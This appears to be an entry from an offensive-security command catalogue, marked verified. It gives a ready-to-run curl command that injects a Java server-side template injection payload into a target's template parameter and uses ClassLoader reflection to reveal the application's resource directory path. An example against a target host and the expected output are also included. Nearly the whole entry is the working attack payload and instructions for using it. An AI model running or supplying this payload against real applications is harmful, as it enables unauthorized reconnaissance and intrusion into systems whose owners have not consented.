---
id: 4feb7b48-fdf4-4425-af96-561f9e6ccd53
name: test-java-ssti-resource-path
type: command
executor: bash
data: >-
  curl
  "$_TARGET_URL?template=${''.getClass().getClassLoader().getResource('').getPath()}"
output: null
created_at: '2023-04-06T03:56:39.297465+00:00'
updated_at: '2024-01-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - ssti
  - java
  - resource
verified: true
validated: true
---

# test-java-ssti-resource-path

## Command

```bash
curl "$_TARGET_URL?template=${''.getClass().getClassLoader().getResource('').getPath()}"
```

## Description

Injects a payload to retrieve the path of the current resource directory via ClassLoader, disclosing application structure.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | Full URL of the vulnerable endpoint | Yes |

## Examples

### Basic Usage

```bash
curl "http://target.com/render?template=${''.getClass().getClassLoader().getResource('').getPath()}"
```

## Expected Output

Response shows a path like '/Users/username/project/src/main/resources/' in the template output.

## Related

- [[procedures/Java-SSTI-Basic-Injection-Using-ClassLoader-and-Resource-Retrieval]]
